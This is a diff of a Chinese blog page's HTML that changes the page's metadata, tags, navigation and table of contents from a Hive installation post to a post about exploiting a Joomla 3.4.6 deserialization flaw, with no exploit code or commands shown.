+  <p><span>本文标题:</span><a href="/joomla3-4-6反序列化漏洞利用/">joomla3.4.6反序列化漏洞利用</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 boogle 的个人博客">boogle</a></p>
-  <p><span>发布时间:</span>2019年04月17日 - 10:00</p>
-  <p><span>最后更新:</span>2019年04月17日 - 10:01</p>
-  <p><span>原始链接:</span><a href="/Centos7配置安装HIVE/" title="Centos7配置安装HIVE">https://zhengbao.wang/Centos7配置安装HIVE/</a>
-    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://zhengbao.wang/Centos7配置安装HIVE/" aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2019年10月09日 - 16:58</p>
+  <p><span>最后更新:</span>2019年10月09日 - 16:59</p>
+  <p><span>原始链接:</span><a href="/joomla3-4-6反序列化漏洞利用/" title="joomla3.4.6反序列化漏洞利用">https://zhengbao.wang/joomla3-4-6反序列化漏洞利用/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://zhengbao.wang/joomla3-4-6反序列化漏洞利用/" aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
 </div>
@@ -545,9 +539,11 @@
       
         <div class="post-tags">
           
-            <a href="/tags/hadoop/" rel="tag"><i class="fa fa-tag"></i> hadoop</a>
+            <a href="/tags/反序列化/" rel="tag"><i class="fa fa-tag"></i> 反序列化</a>
           
-            <a href="/tags/hive/" rel="tag"><i class="fa fa-tag"></i> hive</a>
+            <a href="/tags/对象注入/" rel="tag"><i class="fa fa-tag"></i> 对象注入</a>
+          
+            <a href="/tags/代码执行/" rel="tag"><i class="fa fa-tag"></i> 代码执行</a>
           
         </div>
       
@@ -560,8 +556,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/java代码审计入门之s2-001复现分析/" rel="next" title="java代码审计入门之s2-001复现分析">
-                <i class="fa fa-chevron-left"></i> java代码审计入门之s2-001复现分析
+              <a href="/vBulletin-5-x远程代码执行漏洞利用/" rel="next" title="vBulletin 5.x远程代码执行漏洞利用">
+                <i class="fa fa-chevron-left"></i> vBulletin 5.x远程代码执行漏洞利用
               </a>
             
           </div>
@@ -569,10 +565,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/java代码审计入门之s2-002复现分析/" rel="prev" title="java代码审计入门之s2-002复现分析">
-                java代码审计入门之s2-002复现分析 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -767,7 +759,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-配置安装HIVE"><span class="nav-number">2.</span> <span class="nav-text">0x01 配置安装HIVE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#下载"><span class="nav-number">2.1.</span> <span class="nav-text">下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#配置环境变量"><span class="nav-number">2.2.</span> <span class="nav-text">配置环境变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修改配置文件"><span class="nav-number">2.3.</span> <span class="nav-text">修改配置文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Schema初始化"><span class="nav-number">2.4.</span> <span class="nav-text">Schema初始化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#启动HIVE"><span class="nav-number">2.5.</span> <span class="nav-text">启动HIVE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-HIVE命令"><span class="nav-number">3.</span> <span class="nav-text">0x02 HIVE命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-问题解决"><span class="nav-number">4.</span> <span class="nav-text">0x03 问题解决</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#expansion-character问题"><span class="nav-number">4.1.</span> <span class="nav-text">expansion character问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#system-xxx-路径错误问题"><span class="nav-number">4.2.</span> <span class="nav-text">${system:xxx}路径错误问题</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-漏洞利用"><span class="nav-number">2.</span> <span class="nav-text">0x01 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-参考链接"><span class="nav-number">3.</span> <span class="nav-text">0x02 参考链接</span></a></li></ol></div>
             
 
           </div>
